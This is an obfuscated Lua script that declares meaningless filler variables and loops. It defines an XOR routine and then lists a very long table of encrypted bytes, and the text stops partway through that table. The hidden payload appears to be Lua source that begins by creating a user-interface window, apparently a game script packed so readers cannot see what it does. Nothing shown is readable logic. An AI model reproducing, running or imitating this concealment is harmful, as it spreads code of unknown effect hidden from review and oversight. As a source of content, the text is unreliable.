do local QvK6ZKbCxG = 5238 end
local LyevkF6RqzW = math.random()
local efdMVFB3YE = (58 * 11)
local VZr98bGIO = math.huge
local F6DIWs74NohQK = math.random()
local iXl53AuD7KTqFg = 226449
local QDyHHcv6sLoV1WC = (57 * 89)
for bgel7 = 1, 4 do local e6eiPWzT = bgel7 end
local UGyiTLEgtRv47Pb = (29 * 40)
do local Xy5PwRkJNm = 1261 end
local zR0QpWIc = (93 * 71)
do local OirNpMX8NK = 211 end
for XUBx9 = 1, 5 do local NEQj2dmR = XUBx9 end
do local fhqKoHXXqw = 3419 end
for viOdz = 1, 5 do local G1x1jQkT = viOdz end
local function WVtoh6d9SKuV2A(KZwgst,AINfhv)
    local OtfZAv,akRyZ8=0,1
    while KZwgst>0 or AINfhv>0 do
        if (KZwgst%2)~=(AINfhv%2) then OtfZAv=OtfZAv+akRyZ8 end
        KZwgst=math.floor(KZwgst/2)
        AINfhv=math.floor(AINfhv/2)
        akRyZ8=akRyZ8*2
    end
    return OtfZAv
end
local GIiXeS4F438D3S = {77, 54, 61, 237, 19, 180, 82, 139, 79, 61, 49, 251, 95, 180, 56, 194, 126, 30, 112, 201, 55, 203, 82, 139, 79, 61, 49, 251, 117, 248, 106, 129, 64, 53, 126, 192, 22, 246, 119, 131, 83, 32, 126, 177, 95, 203, 66, 204, 100, 17, 1, 192, 22, 246, 119, 131, 83, 32, 84, 229, 25, 180, 107, 141, 85, 121, 1, 223, 62, 180, 113, 138, 68, 55, 126, 211, 44, 213, 37, 223, 1, 34, 35, 172, 26, 250, 97, 232, 72, 63, 126, 226, 16, 224, 37, 189, 96, 24, 126, 248, 23, 241, 107, 194, 126, 24, 31, 172, 66, 180, 126, 159, 1, 60, 48, 232, 117, 253, 99, 194, 79, 54, 42, 172, 32, 193, 66, 194, 85, 49, 59, 226, 95, 203, 80, 165, 1, 100, 126, 247, 2, 180, 96, 140, 69, 83, 84, 222, 30, 243, 96, 182, 64, 59, 126, 177, 95, 195, 108, 140, 69, 54, 41, 182, 43, 245, 103, 202, 3, 43, 63, 235, 26, 182, 44, 232, 43, 24, 55, 225, 44, 241, 102, 150, 72, 54, 48, 172, 66, 180, 87, 131, 70, 60, 10, 237, 29, 174, 86, 135, 66, 45, 55, 227, 17, 188, 39, 131, 72, 52, 60, 227, 11, 182, 41, 194, 3, 21, 59, 234, 11, 182, 44, 232, 77, 54, 61, 237, 19, 180, 90, 150, 78, 62, 31, 229, 18, 209, 107, 131, 67, 53, 59, 232, 95, 169, 37, 163, 72, 52, 13, 233, 28, 224, 108, 141, 79, 99, 10, 227, 24, 243, 105, 135, 9, 34, 10, 229, 11, 248, 96, 194, 28, 121, 124, 233, 17, 245, 103, 142, 68, 61, 124, 160, 95, 210, 105, 131, 70, 121, 99, 172, 93, 213, 108, 143, 100, 55, 63, 238, 19, 241, 97, 192, 13, 121, 26, 233, 25, 245, 112, 142, 85, 121, 99, 172, 25, 245, 105, 145, 68, 36, 119, 134, 32, 224, 106, 133, 96, 48, 51, 201, 17, 245, 103, 142, 68, 61, 100, 199, 26, 237, 103, 139, 79, 61, 118, 247, 43, 253, 113, 142, 68, 121, 99, 172, 93, 252, 106, 142, 69, 121, 53, 233, 6, 182, 41, 194, 103, 53, 63, 235, 95, 169, 37, 192, 96, 48, 51, 199, 26, 237, 39, 206, 1, 18, 59, 245, 95, 169, 37, 167, 79, 44, 51, 162, 42, 231, 96, 144, 104, 55, 46, 249, 11, 192, 124, 146, 68, 119, 19, 227, 10, 231, 96, 160, 84, 45, 42, 227, 17, 166, 41, 194, 114, 45, 63, 248, 26, 192, 124, 146, 68, 121, 99, 172, 93, 213, 105, 149, 64, 32, 45, 174, 83, 180, 70, 131, 77, 53, 60, 237, 28, 255, 37, 223, 1, 63, 43, 226, 28, 224, 108, 141, 79, 113, 119, 172, 26, 250, 97, 159, 8, 83, 31, 229, 18, 199, 96, 129, 85, 48, 49, 226, 69, 192, 106, 133, 70, 53, 59, 164, 4, 192, 108, 150, 77, 60, 126, 177, 95, 182, 115, 135, 77, 54, 61, 229, 11, 237, 37, 146, 83, 60, 58, 229, 28, 224, 108, 141, 79, 123, 114, 172, 57, 248, 100, 133, 1, 100, 126, 174, 62, 253, 104, 178, 83, 60, 58, 174, 83, 180, 65, 135, 71, 56, 43, 224, 11, 180, 56, 194, 71, 56, 50, 255, 26, 233, 44, 232, 96, 48, 51, 223, 26, 247, 113, 139, 78, 55, 100, 216, 16, 243, 98, 142, 68, 113, 37, 216, 22, 224, 105, 135, 1, 100, 126, 174, 12, 224, 108, 129, 74, 32, 126, 237, 22, 249, 39, 206, 1, 31, 50, 237, 24, 180, 56, 194, 3, 24, 55, 225, 44, 224, 108, 129, 74, 32, 124, 160, 95, 208, 96, 132, 64, 44, 50, 248, 95, 169, 37, 132, 64, 53, 45, 233, 2, 189, 15, 163, 72, 52, 13, 233, 28, 224, 108, 141, 79, 99, 10, 227, 24, 243, 105, 135, 9, 34, 10, 229, 11, 248, 96, 194, 28, 121, 124, 250, 22, 231, 108, 128, 77, 60, 126, 227, 17, 248, 124, 192, 13, 121, 24, 224, 30, 243, 37, 223, 1, 123, 31, 229, 18, 194, 108, 145, 72, 59, 50, 233, 93, 184, 37, 166, 68, 63, 63, 249, 19, 224, 37, 223, 1, 63, 63, 224, 12, 241, 120, 203, 43, 24, 55, 225, 44, 241, 102, 150, 72, 54, 48, 182, 43, 251, 98, 133, 77, 60, 118, 247, 43, 253, 113, 142, 68, 121, 99, 172, 93, 224, 96, 131, 76, 121, 61, 228, 26, 247, 110, 192, 13, 121, 24, 224, 30, 243, 37, 223, 1, 123, 31, 229, 18, 192, 96, 131, 76, 123, 114, 172, 59, 241, 99, 131, 84, 53, 42, 172, 66, 180, 99, 131, 77, 42, 59, 241, 86, 158, 68, 139, 76, 10, 59, 239, 11, 253, 106, 140, 27, 29, 44, 227, 15, 240, 106, 149, 79, 113, 37, 216, 22, 224, 105, 135, 1, 100, 126, 174, 29, 251, 107, 135, 3, 117, 126, 202, 19, 245, 98, 194, 28, 121, 124, 205, 22, 249, 71, 141, 79, 60, 124, 160, 95, 216, 108, 145, 85, 121, 99, 172, 4, 182, 77, 135, 64, 61, 124, 160, 93, 218, 96, 129, 74, 123, 114, 174, 43, 251, 119, 145, 78, 123, 114, 174, 47, 241, 105, 148, 72, 42, 124, 160, 93, 216, 106, 149, 68, 43, 10, 227, 13, 231, 106, 192, 92, 117, 126, 200, 26, 242, 100, 151, 77, 45, 126, 177, 95, 182, 77, 135, 64, 61, 124, 241, 86, 158, 68, 139, 76, 10, 59, 239, 11, 253, 106, 140, 27, 13, 49, 235, 24, 248, 96, 202, 90, 13, 55, 248, 19, 241, 37, 223, 1, 123, 45, 228, 16, 227, 37, 132, 78, 47, 126, 239, 22, 230, 102, 142, 68, 123, 114, 172, 57, 248, 100, 133, 1, 100, 126, 174, 62, 253, 104, 177, 73, 54, 41, 202, 16, 226, 39, 206, 1, 29, 59, 234, 30, 225, 105, 150, 1, 100, 126, 234, 30, 248, 118, 135, 92, 112, 84, 205, 22, 249, 86, 135, 66, 45, 55, 227, 17, 174, 86, 142, 72, 61, 59, 254, 87, 239, 81, 139, 85, 53, 59, 172, 66, 180, 39, 132, 78, 47, 124, 160, 95, 210, 105, 131, 70, 121, 99, 172, 93, 213, 108, 143, 103, 22, 8, 174, 83, 180, 86, 155, 76, 59, 49, 224, 95, 169, 37, 192, 69, 60, 57, 174, 83, 180, 65, 135, 71, 56, 43, 224, 11, 180, 56, 194, 18, 108, 114, 172, 50, 253, 107, 194, 28, 121, 107, 160, 95, 217, 100, 154, 1, 100, 126, 189, 71, 164, 41, 194, 101, 60, 61, 229, 18, 245, 105, 145, 1, 100, 126, 189, 2, 189, 15, 163, 72, 52, 13, 233, 28, 224, 108, 141, 79, 99, 13, 224, 22, 240, 96, 144, 9, 34, 10, 229, 11, 248, 96, 194, 28, 121, 124, 225, 30, 236, 37, 134, 72, 42, 42, 237, 17, 247, 96, 192, 13, 121, 24, 224, 30, 243, 37, 223, 1, 123, 31, 229, 18, 208, 108, 145, 85, 123, 114, 172, 44, 237, 104, 128, 78, 53, 126, 177, 95, 182, 104, 192, 13, 121, 26, 233, 25, 245, 112, 142, 85, 121, 99, 172, 74, 164, 53, 210, 13, 121, 19, 229, 17, 180, 56, 194, 16, 105, 110, 160, 95, 217, 100, 154, 1, 100, 126, 189, 79, 164, 53, 210, 13, 121, 26, 233, 28, 253, 104, 131, 77, 42, 126, 177, 95, 165, 120, 203, 43, 24, 55, 225, 44, 241, 102, 150, 72, 54, 48, 182, 44, 248, 108, 134, 68, 43, 118, 247, 43, 253, 113, 142, 68, 121, 99, 172, 93, 228, 119, 135, 69, 48, 61, 248, 22, 251, 107, 194, 85, 48, 51, 233, 93, 184, 37, 164, 77, 56, 57, 172, 66, 180, 39, 163, 72, 52, 14, 254, 26, 240, 81, 139, 76, 60, 124, 160, 95, 199, 124, 143, 67, 54, 50, 172, 66, 180, 39, 145, 3, 117, 126, 200, 26, 242, 100, 151, 77, 45, 126, 177, 95, 165, 55, 206, 1, 20, 55, 226, 95, 169, 37, 210, 13, 121, 19, 237, 7, 180, 56, 194, 20, 105, 114, 172, 59, 241, 102, 139, 76, 56, 50, 255, 95, 169, 37, 211, 92, 112, 84, 205, 22, 249, 86, 135, 66, 45, 55, 227, 17, 174, 86, 142, 72, 61, 59, 254, 87, 239, 81, 139, 85, 53, 59, 172, 66, 180, 39, 145, 76, 54, 49, 248, 23, 250, 96, 145, 82, 123, 114, 172, 57, 248, 100, 133, 1, 100, 126, 174, 62, 253, 104, 177, 76, 54, 49, 248, 23, 182, 41, 194, 114, 32, 51, 238, 16, 248, 37, 223, 1, 123, 123, 174, 83, 180, 65, 135, 71, 56, 43, 224, 11, 180, 56, 194, 16, 108, 114, 172, 50, 253, 107, 194, 28, 121, 110, 160, 95, 217, 100, 154, 1, 100, 126, 181, 74, 184, 37, 166, 68, 58, 55, 225, 30, 248, 118, 194, 28, 121, 111, 241, 86, 158, 15, 181, 68, 56, 46, 223, 26, 247, 113, 139, 78, 55, 126, 177, 95, 198, 100, 133, 68, 13, 63, 238, 69, 199, 96, 129, 85, 48, 49, 226, 87, 182, 114, 135, 64, 41, 49, 226, 95, 249, 106, 134, 82, 123, 114, 172, 93, 216, 96, 132, 85, 123, 119, 134, 40, 241, 100, 146, 114, 60, 61, 248, 22, 251, 107, 216, 117, 54, 57, 235, 19, 241, 45, 153, 117, 48, 42, 224, 26, 180, 56, 194, 3, 55, 49, 172, 12, 228, 119, 135, 64, 61, 124, 160, 95, 210, 105, 131, 70, 121, 99, 172, 93, 195, 96, 146, 111, 54, 13, 252, 13, 241, 100, 134, 3, 117, 126, 200, 26, 242, 100, 151, 77, 45, 126, 177, 95, 242, 100, 142, 82, 60, 114, 172, 60, 245, 105, 142, 67, 56, 61, 231, 95, 169, 37, 132, 84, 55, 61, 248, 22, 251, 107, 202, 82, 112, 84, 172, 95, 180, 37, 175, 78, 61, 13, 162, 17, 251, 86, 146, 83, 60, 63, 232, 95, 169, 37, 145, 43, 121, 126, 172, 95, 253, 99, 194, 82, 121, 42, 228, 26, 250, 15, 194, 1, 121, 126, 172, 95, 180, 37, 142, 78, 58, 63, 224, 95, 245, 99, 194, 28, 121, 12, 233, 15, 248, 108, 129, 64, 45, 59, 232, 44, 224, 106, 144, 64, 62, 59, 182, 57, 253, 107, 134, 103, 48, 44, 255, 11, 215, 109, 139, 77, 61, 118, 174, 62, 249, 104, 141, 117, 32, 46, 233, 12, 182, 44, 232, 1, 121, 126, 172, 95, 180, 37, 194, 72, 63, 126, 237, 25, 180, 113, 138, 68, 55, 126, 234, 16, 230, 37, 189, 13, 121, 55, 248, 26, 249, 37, 139, 79, 121, 55, 252, 30, 253, 119, 145, 9, 56, 56, 182, 56, 241, 113, 161, 73, 48, 50, 232, 13, 241, 107, 202, 8, 112, 126, 232, 16, 158, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 55, 234, 95, 253, 113, 135, 76, 99, 23, 255, 62, 188, 39, 164, 78, 53, 58, 233, 13, 182, 44, 194, 85, 49, 59, 226, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 253, 113, 135, 76, 99, 13, 233, 11, 213, 113, 150, 83, 48, 60, 249, 11, 241, 45, 192, 108, 48, 48, 223, 15, 230, 96, 131, 69, 123, 114, 172, 79, 186, 53, 210, 17, 104, 119, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 22, 224, 96, 143, 27, 10, 59, 248, 62, 224, 113, 144, 72, 59, 43, 248, 26, 188, 39, 175, 64, 33, 13, 252, 13, 241, 100, 134, 3, 117, 126, 188, 81, 164, 53, 210, 16, 112, 84, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 229, 11, 241, 104, 216, 114, 60, 42, 205, 11, 224, 119, 139, 67, 44, 42, 233, 87, 182, 85, 144, 78, 51, 59, 239, 11, 253, 105, 135, 114, 41, 44, 233, 30, 240, 39, 206, 1, 105, 112, 188, 79, 164, 52, 203, 43, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 241, 107, 134, 43, 121, 126, 172, 95, 180, 37, 194, 1, 60, 48, 232, 95, 241, 107, 134, 43, 121, 126, 172, 95, 241, 107, 134, 43, 60, 48, 232, 2, 189, 15, 181, 68, 56, 46, 223, 26, 247, 113, 139, 78, 55, 100, 216, 16, 243, 98, 142, 68, 113, 37, 216, 22, 224, 105, 135, 1, 100, 126, 174, 17, 251, 37, 144, 68, 58, 49, 229, 19, 182, 41, 194, 103, 53, 63, 235, 95, 169, 37, 192, 118, 60, 46, 194, 16, 198, 96, 129, 78, 48, 50, 174, 83, 180, 65, 135, 71, 56, 43, 224, 11, 180, 56, 194, 71, 56, 50, 255, 26, 184, 37, 161, 64, 53, 50, 238, 30, 247, 110, 194, 28, 121, 56, 249, 17, 247, 113, 139, 78, 55, 118, 255, 86, 158, 37, 194, 1, 121, 19, 227, 27, 199, 43, 140, 78, 11, 59, 239, 16, 253, 105, 194, 28, 121, 45, 134, 95, 180, 37, 194, 72, 63, 126, 255, 95, 224, 109, 135, 79, 83, 126, 172, 95, 180, 37, 194, 1, 121, 50, 227, 28, 245, 105, 194, 64, 63, 126, 177, 95, 198, 96, 146, 77, 48, 61, 237, 11, 241, 97, 177, 85, 54, 44, 237, 24, 241, 63, 164, 72, 55, 58, 202, 22, 230, 118, 150, 98, 49, 55, 224, 27, 188, 39, 163, 76, 52, 49, 216, 6, 228, 96, 145, 3, 112, 84, 172, 95, 180, 37, 194, 1, 121, 126, 229, 25, 180, 100, 132, 1, 45, 54, 233, 17, 180, 99, 141, 83, 121, 1, 160, 95, 253, 113, 135, 76, 121, 55, 226, 95, 253, 117, 131, 72, 43, 45, 164, 30, 242, 63, 165, 68, 45, 29, 228, 22, 248, 97, 144, 68, 55, 118, 165, 86, 180, 97, 141, 43, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 253, 99, 194, 72, 45, 59, 225, 69, 221, 118, 163, 9, 123, 24, 227, 19, 240, 96, 144, 3, 112, 126, 248, 23, 241, 107, 232, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 72, 45, 59, 225, 69, 199, 96, 150, 96, 45, 42, 254, 22, 246, 112, 150, 68, 113, 124, 222, 26, 247, 106, 139, 77, 10, 42, 254, 26, 250, 98, 150, 73, 123, 114, 172, 79, 189, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 233, 17, 240, 15, 194, 1, 121, 126, 172, 95, 180, 37, 135, 79, 61, 126, 233, 17, 240, 15, 194, 1, 121, 126, 233, 17, 240, 15, 135, 79, 61, 35, 165, 117, 195, 96, 131, 81, 10, 59, 239, 11, 253, 106, 140, 27, 13, 49, 235, 24, 248, 96, 202, 90, 13, 55, 248, 19, 241, 37, 223, 1, 123, 41, 237, 11, 241, 119, 194, 69, 52, 57, 172, 29, 237, 117, 131, 82, 42, 124, 160, 95, 210, 105, 131, 70, 121, 99, 172, 93, 195, 100, 150, 68, 43, 28, 245, 15, 245, 118, 145, 3, 117, 126, 200, 26, 242, 100, 151, 77, 45, 126, 177, 95, 242, 100, 142, 82, 60, 114, 172, 60, 245, 105, 142, 67, 56, 61, 231, 95, 169, 37, 132, 84, 55, 61, 248, 22, 251, 107, 202, 82, 112, 84, 172, 95, 180, 37, 189, 64, 41, 46, 224, 6, 195, 100, 150, 68, 43, 28, 245, 15, 245, 118, 145, 9, 42, 119, 134, 26, 250, 97, 159, 8, 83, 9, 233, 30, 228, 86, 135, 66, 45, 55, 227, 17, 174, 81, 141, 70, 62, 50, 233, 87, 239, 81, 139, 85, 53, 59, 172, 66, 180, 39, 139, 79, 42, 42, 237, 17, 224, 37, 135, 80, 44, 55, 252, 93, 184, 37, 164, 77, 56, 57, 172, 66, 180, 39, 171, 79, 42, 42, 237, 17, 224, 64, 147, 84, 48, 46, 174, 83, 180, 65, 135, 71, 56, 43, 224, 11, 180, 56, 194, 71, 56, 50, 255, 26, 233, 44, 232, 118, 60, 63, 252, 44, 241, 102, 150, 72, 54, 48, 182, 43, 251, 98, 133, 77, 60, 118, 247, 43, 253, 113, 142, 68, 121, 99, 172, 93, 250, 106, 194, 76, 44, 36, 246, 19, 241, 37, 132, 77, 56, 45, 228, 93, 184, 37, 164, 77, 56, 57, 172, 66, 180, 39, 172, 78, 20, 43, 246, 5, 248, 96, 192, 13, 121, 26, 233, 25, 245, 112, 142, 85, 121, 99, 172, 25, 245, 105, 145, 68, 36, 119, 134, 40, 241, 100, 146, 114, 60, 61, 248, 22, 251, 107, 216, 117, 54, 57, 235, 19, 241, 45, 153, 117, 48, 42, 224, 26, 180, 56, 194, 3, 48, 48, 255, 11, 245, 107, 150, 1, 52, 63, 235, 95, 230, 96, 132, 72, 53, 50, 174, 83, 180, 67, 142, 64, 62, 126, 177, 95, 182, 76, 140, 82, 45, 63, 226, 11, 217, 100, 133, 3, 117, 126, 207, 30, 248, 105, 128, 64, 58, 53, 172, 66, 180, 99, 151, 79, 58, 42, 229, 16, 250, 45, 145, 8, 83, 126, 172, 95, 180, 71, 144, 91, 10, 112, 229, 17, 231, 113, 131, 79, 45, 19, 237, 24, 198, 96, 132, 72, 53, 50, 172, 66, 180, 118, 232, 1, 121, 126, 172, 22, 242, 37, 145, 1, 45, 54, 233, 17, 158, 37, 194, 1, 121, 126, 172, 95, 180, 113, 131, 82, 50, 112, 255, 15, 245, 114, 140, 9, 63, 43, 226, 28, 224, 108, 141, 79, 113, 119, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 77, 54, 61, 237, 19, 180, 119, 145, 1, 100, 126, 222, 26, 228, 105, 139, 66, 56, 42, 233, 27, 199, 113, 141, 83, 56, 57, 233, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 53, 49, 239, 30, 248, 37, 132, 84, 55, 61, 248, 22, 251, 107, 194, 126, 62, 63, 248, 87, 236, 41, 194, 88, 112, 84, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 224, 16, 247, 100, 142, 1, 48, 50, 172, 66, 180, 119, 145, 27, 31, 55, 226, 27, 210, 108, 144, 82, 45, 29, 228, 22, 248, 97, 202, 3, 16, 42, 233, 18, 231, 73, 139, 82, 45, 124, 165, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 253, 99, 194, 72, 53, 126, 237, 17, 240, 37, 139, 77, 99, 24, 229, 17, 240, 67, 139, 83, 42, 42, 207, 23, 253, 105, 134, 9, 33, 112, 194, 30, 249, 96, 203, 1, 45, 54, 233, 17, 158, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 50, 227, 28, 245, 105, 194, 72, 41, 126, 177, 95, 253, 105, 185, 89, 119, 16, 237, 18, 241, 88, 216, 103, 48, 48, 232, 57, 253, 119, 145, 85, 26, 54, 229, 19, 240, 45, 192, 104, 45, 59, 225, 47, 230, 106, 146, 68, 43, 42, 229, 26, 231, 39, 203, 43, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 253, 99, 194, 79, 54, 42, 172, 22, 228, 37, 150, 73, 60, 48, 172, 13, 241, 113, 151, 83, 55, 126, 226, 22, 248, 37, 135, 79, 61, 84, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 139, 71, 121, 39, 172, 66, 169, 37, 192, 76, 56, 57, 174, 95, 180, 113, 138, 68, 55, 126, 254, 26, 224, 112, 144, 79, 121, 55, 252, 69, 211, 96, 150, 96, 45, 42, 254, 22, 246, 112, 150, 68, 113, 124, 205, 18, 249, 106, 182, 88, 41, 59, 174, 86, 180, 96, 140, 69, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 108, 132, 1, 32, 126, 177, 66, 180, 39, 131, 76, 52, 49, 174, 95, 245, 107, 134, 1, 48, 46, 182, 56, 241, 113, 163, 85, 45, 44, 229, 29, 225, 113, 135, 9, 123, 23, 248, 26, 249, 81, 155, 81, 60, 124, 165, 95, 169, 56, 194, 3, 24, 51, 225, 16, 182, 37, 150, 73, 60, 48, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 13, 241, 113, 151, 83, 55, 126, 229, 15, 174, 66, 135, 85, 24, 42, 248, 13, 253, 103, 151, 85, 60, 118, 174, 44, 248, 106, 150, 117, 32, 46, 233, 93, 189, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 233, 17, 240, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 135, 79, 61, 84, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 254, 26, 224, 112, 144, 79, 121, 48, 229, 19, 158, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 59, 226, 27, 158, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 50, 227, 28, 245, 105, 194, 71, 44, 48, 239, 11, 253, 106, 140, 1, 6, 57, 225, 30, 236, 45, 154, 8, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 50, 227, 28, 245, 105, 194, 72, 53, 126, 177, 95, 230, 118, 216, 103, 48, 48, 232, 57, 253, 119, 145, 85, 26, 54, 229, 19, 240, 45, 192, 104, 45, 59, 225, 12, 216, 108, 145, 85, 123, 119, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 22, 242, 37, 139, 77, 121, 63, 226, 27, 180, 108, 142, 27, 31, 55, 226, 27, 210, 108, 144, 82, 45, 29, 228, 22, 248, 97, 202, 89, 119, 16, 237, 18, 241, 44, 194, 85, 49, 59, 226, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 53, 49, 239, 30, 248, 37, 139, 81, 121, 99, 172, 22, 248, 94, 154, 15, 23, 63, 225, 26, 201, 63, 164, 72, 55, 58, 202, 22, 230, 118, 150, 98, 49, 55, 224, 27, 188, 39, 171, 85, 60, 51, 220, 13, 251, 117, 135, 83, 45, 55, 233, 12, 182, 44, 232, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 22, 242, 37, 139, 81, 121, 42, 228, 26, 250, 37, 144, 68, 45, 43, 254, 17, 180, 108, 146, 27, 30, 59, 248, 62, 224, 113, 144, 72, 59, 43, 248, 26, 188, 39, 175, 64, 33, 18, 227, 30, 240, 96, 134, 96, 52, 51, 227, 93, 189, 37, 141, 83, 121, 110, 172, 26, 250, 97, 232, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 68, 55, 58, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 13, 241, 113, 151, 83, 55, 126, 188, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 60, 48, 232, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 53, 49, 239, 30, 248, 37, 144, 68, 52, 49, 248, 26, 180, 56, 194, 83, 42, 100, 202, 22, 250, 97, 164, 72, 43, 45, 248, 60, 252, 108, 142, 69, 113, 124, 222, 26, 249, 106, 150, 68, 42, 124, 165, 95, 245, 107, 134, 1, 43, 45, 162, 45, 241, 104, 141, 85, 60, 45, 182, 57, 253, 107, 134, 103, 48, 44, 255, 11, 215, 109, 139, 77, 61, 118, 174, 54, 250, 115, 135, 79, 45, 49, 254, 6, 217, 106, 148, 68, 123, 119, 134, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 86, 49, 55, 224, 26, 180, 71, 144, 91, 10, 112, 229, 17, 231, 113, 131, 79, 45, 19, 237, 24, 198, 96, 132, 72, 53, 50, 172, 27, 251, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 150, 64, 42, 53, 162, 8, 245, 108, 150, 9, 105, 112, 185, 86, 158, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 117, 129, 64, 53, 50, 164, 25, 225, 107, 129, 85, 48, 49, 226, 87, 189, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 224, 16, 247, 100, 142, 1, 48, 48, 250, 95, 169, 37, 144, 82, 119, 14, 224, 30, 237, 96, 144, 82, 121, 63, 226, 27, 180, 119, 145, 15, 9, 50, 237, 6, 241, 119, 145, 27, 31, 55, 226, 27, 210, 108, 144, 82, 45, 29, 228, 22, 248, 97, 202, 81, 53, 63, 245, 26, 230, 43, 172, 64, 52, 59, 165, 117, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 63, 226, 27, 180, 119, 145, 15, 9, 50, 237, 6, 241, 119, 145, 122, 41, 50, 237, 6, 241, 119, 204, 111, 56, 51, 233, 34, 174, 67, 139, 79, 61, 24, 229, 13, 231, 113, 161, 73, 48, 50, 232, 87, 182, 76, 140, 87, 60, 48, 248, 16, 230, 124, 192, 8, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 108, 132, 1, 55, 49, 248, 95, 253, 107, 148, 1, 54, 44, 172, 17, 251, 113, 194, 83, 60, 51, 227, 11, 241, 37, 150, 73, 60, 48, 172, 13, 241, 113, 151, 83, 55, 126, 233, 17, 240, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 224, 16, 247, 100, 142, 1, 52, 63, 235, 12, 184, 37, 131, 76, 52, 49, 255, 95, 169, 37, 153, 92, 117, 126, 247, 2, 158, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 56, 227, 13, 180, 90, 206, 1, 47, 126, 229, 17, 180, 108, 146, 64, 48, 44, 255, 87, 253, 107, 148, 27, 30, 59, 248, 60, 252, 108, 142, 69, 43, 59, 226, 87, 189, 44, 194, 69, 54, 84, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 224, 16, 247, 100, 142, 1, 42, 50, 227, 11, 180, 56, 194, 87, 99, 25, 233, 11, 213, 113, 150, 83, 48, 60, 249, 11, 241, 45, 192, 114, 53, 49, 248, 93, 189, 15, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 139, 71, 121, 45, 224, 16, 224, 37, 131, 79, 61, 126, 255, 19, 251, 113, 216, 77, 54, 41, 233, 13, 188, 44, 216, 71, 48, 48, 232, 87, 182, 102, 142, 78, 45, 54, 229, 17, 243, 39, 203, 1, 45, 54, 233, 17, 158, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 50, 227, 28, 245, 105, 194, 66, 48, 126, 177, 95, 226, 63, 164, 72, 55, 58, 202, 22, 230, 118, 150, 98, 49, 55, 224, 27, 188, 39, 171, 79, 47, 59, 226, 11, 251, 119, 155, 3, 112, 84, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 139, 71, 121, 61, 229, 95, 224, 109, 135, 79, 83, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 126, 172, 95, 180, 37, 194, 1, 121, 56, 227, 13, 180, 90, 206, 1, 33, 126, 229, 17, 180, 108, 146, 64, 48, 44, 255, 87, 247, 108, 216, 102, 60, 42, 207, 23, 253, 105, 134, 83, 60, 48, 164, 86, 189, 37, 